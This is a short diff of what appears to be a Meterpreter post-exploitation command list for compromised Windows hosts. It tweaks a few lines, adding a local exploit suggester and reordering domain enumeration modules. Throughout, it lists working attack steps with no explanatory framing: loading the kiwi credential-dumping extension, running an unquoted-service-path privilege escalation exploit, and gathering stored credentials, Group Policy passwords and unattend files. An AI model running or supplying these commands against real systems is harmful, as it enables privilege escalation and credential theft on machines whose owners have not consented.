@@ -511,13 +511,14 @@ getprivs
 sysinfo
 execute -H -i -f powershell.exe -a "-Command Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
 arp
-ipconfig
+ifconfig
 load exploit
 load kiwi
 load priv
 run exploit/windows/local/unquoted_service_path LHOST=eth1
-run post/windows/gather/enum_domain
+run multi/recon/local_exploit_suggester
 run post/windows/gather/enum_domains
+run post/windows/gather/enum_domain
 run post/windows/gather/enum_unattend
 run post/windows/gather/credentials/enum_cred_store
 run post/windows/gather/credentials/gpp
